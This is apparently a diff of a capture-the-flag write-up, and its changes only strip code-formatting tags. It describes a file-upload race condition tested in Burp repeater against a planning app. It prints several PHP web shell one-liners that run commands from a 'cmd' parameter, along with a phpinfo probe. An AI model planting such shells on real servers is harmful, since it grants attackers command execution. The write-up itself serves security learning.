@@ -30,7 +30,6 @@ We register/login and find a planning tool. We can add bullet points, but there 
 
 More importantly, we can upload a file. There is no filter on the file extension or content-type, but our file is deleted immediately after the scan. According to the JS source, the site is expecting JSON content.
 
-{% code overflow="wrap" %}
 ```javascript
 document.getElementById("uploadForm").addEventListener("submit", async function (e) {
     e.preventDefault();
@@ -74,7 +73,6 @@ document.getElementById("uploadForm").addEventListener("submit", async function 
     });
 });
 ```
-{% endcode %}
 
 However, even when sending a JSON file, the server says the file was deleted after scan (wrong type). I thought maybe we could fuzz file extensions/content-types, but then I remembered a Portswigger lab I solved in the past.
 
@@ -86,37 +84,29 @@ To test the hypothesis, I created a group of tabs in burp repeater. The first up
 
 I switched the file type to a basic PHP shell, with the rest of the repeater tabs making a GET request to `/uploads/new.php?cmd=whoami`
 
-{% code overflow="wrap" %}
 ```php
 <?php system($_GET['cmd']); ?>
 ```
-{% endcode %}
 
 Unfortunately, all these requests came back with a 500 internal server error, or 404 not found. I changed the PHP file contents to a more benign one, and it worked (printed "meow").
 
-{% code overflow="wrap" %}
 ```php
 <?php echo("meow") ?>
 ```
-{% endcode %}
 
 I tried a few alternative functions for command execution.
 
-{% code overflow="wrap" %}
 ```php
 <?php system($_REQUEST["cmd"]); ?>
 <?php echo shell_exec($_GET['cmd']); ?>
 <? passthru($_GET["cmd"]); ?>
 ```
-{% endcode %}
 
 They all failed! Eventually I tried to view the `phpinfo()`
 
-{% code overflow="wrap" %}
 ```php
 <?php phpinfo(); ?>
 ```
-{% endcode %}
 
 ![](images/1.PNG)
 
